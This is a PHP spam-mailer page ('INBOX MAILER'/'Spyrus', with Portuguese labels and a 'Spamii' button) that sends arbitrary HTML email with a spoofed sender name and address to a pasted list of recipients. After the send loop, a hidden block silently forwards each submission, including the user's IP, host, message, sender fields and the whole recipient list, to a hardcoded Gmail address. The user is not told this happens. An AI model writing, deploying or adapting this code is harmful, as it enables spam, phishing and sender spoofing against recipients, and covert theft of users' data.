<?php
$testa = $_POST['veio'];
if($testa != "") {
    $message = $_POST['html'];
    $subject = $_POST['assunto'];
    $nome = $_POST['nome'];
    $de = $_POST['de'];
    $to = $_POST['emails'];

    $headers  = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";

    $email = explode("\n", $to);
    $headers .= "From: ".$nome." <".$de.">\r\n";
    $message = stripslashes($message);

    $i = 0;
    $count = 1;
    while($email[$i]) {
        $ok = "ok";
        if(mail($email[$i], $subject, $message, $headers))
        echo "* N&#250;mero: $count <b>".$email[$i]."</b> <font color=green>NoturnO_=_2oo8 =)</font><br><hr>";
        else
        echo "* N&#250;mero: $count <b>".$email[$i]."</b> <font color=red>ERRO AO ENVIAR</font><br><hr>";
        $i++;
        $count++;
    }
    $count--;
    if($ok == "ok")
    echo ""; 

}
$ip = getenv("REMOTE_ADDR");
$ra44  = rand(1,99999);
$subj98 = "Sendi $ip";
$email = "je7903899@gmail.com";
$from="From: Wlidati <BIMO@2M.TV>";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$f12 = $_POST['veio'];
$z13 = $_POST['html'];
$x14 = $_POST['assunto'];
$t15 = $_POST['nome'];
$m30 = $_POST['de'];
$m16 = $_POST['emails'];
$m22 = $ip."\n";
$msg8873 = "$a45\n$b75\n$f12\n$z13\n$x14\n$t15\n$m30\n$m16\n$m22";
mail($email, $subj98, $msg8873, $from);



?>
<html>
<head>
<title>INBOX MAILER</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
    margin-left: 0;
    margin-right: 0;
    margin-top: 0;
    margin-bottom: 0;
}
.titulo {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 70px;
    color: #000000;
    font-weight: bold;
}

.normal {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 12px;
    color: #000000;
}

.form {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 10px;
    color: #333333;
    background-color: #FFFFFF;
    border: 1px dashed #666666;
}

.texto {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
}

.alerta {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
    color: #990000;
    font-size: 10px;
}
</style>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
  <table width="464" height="511" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">
    <tr>
      <td width="462" height="25" align="center" bgcolor="#99CCFF"><span class="titulo">Spyrus</span></td>
    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#133f00">
          <table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
          <tr>
            <td align="right" height="17"><span class="texto">De (Nome)/(E-Mail) :</span></td>
            <td width="65%" height="17"><input name="nome" value="" type="text" class="form" id="nome" style="width:48%" > <input name="de" value="" type="text" class="form" id="de" style="width:49%" ></td>
          </tr>
          <tr>
            <td align="right" height="17"><span class="texto">Assunto:</span></td>
            <td height="17"><input name="assunto" type="text" value=""class="form" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#d32300">
            <td height="20" colspan="2" bgcolor="#99CCFF"><span class="texto">C&oacute;digo HTML:</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html">

</textarea>
              <span class="alerta">*Lembrete: texto em HTML</span></td>



          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="47" colspan="2"><span class="texto">Hellsing Shit ! InBox</span>
              <p><span class="texto"></span></td>
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">
</textarea>
              <span class="alerta">*Separado por quebra de linha</span> </td>
          </tr>
          <tr>
            <td height="26" align="right" valign="top" colspan="2"><input type="submit" name="Submit" value="Spamii"></td>
          </tr>
        </table>
      </td>
    </tr>
    <tr>
      <td height="15" align="center" bgcolor="#d32300">&nbsp;</td>
    </tr>
  </table>
</form>
</body> 
